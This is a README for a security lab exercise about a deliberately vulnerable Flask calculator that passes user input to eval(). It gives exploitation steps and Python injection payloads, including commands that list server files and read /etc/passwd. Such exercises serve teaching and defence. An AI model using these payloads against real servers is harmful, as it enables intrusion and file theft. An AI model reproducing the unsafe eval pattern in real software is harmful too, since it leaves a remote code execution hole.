# Remote Code Execution via Unsafe `eval()` (Flask App)

## Description

This exercise demonstrates a **Remote Code Execution (RCE)** vulnerability caused by unsafe usage of Python's `eval()` function.

The Flask application provides a simple **calculator form** where users can input mathematical expressions.  
However, instead of safely parsing the input, it **directly evaluates user input using `eval()`**, making it possible to execute arbitrary Python code on the server.

---

## Exploitation Steps

1. Open the vulnerable calculator page.
2. Enter malicious Python code instead of a safe mathematical expression. For example:

```python
__import__('os').system('ls')
```

## Payloads

List server files:
```python
__import__('os').system('ls')
```

Read sensitive files:
```python
__import__('builtins').open('/etc/passwd').read()
```

Execute arbitrary Python code:
```python
(lambda: (exec("print('Hacked!')")))()
```

## Why This is Dangerous

- Attackers can execute any Python code on the server.
- They can access sensitive files, open reverse shells, or completely take over the machine.
- Even seemingly "harmless" inputs can escalate into full control of the server.

## Objective for Participants
- ✅ Identify that user input is being evaluated unsafely.
- ✅ Successfully inject Python code to demonstrate arbitrary command execution.

## Tip

Try common Python exploitation patterns first (e.g., using __import__, open, or os.system).
Always be cautious with user inputs — never use eval() on untrusted data!

## Run

```commandline
python main.py
```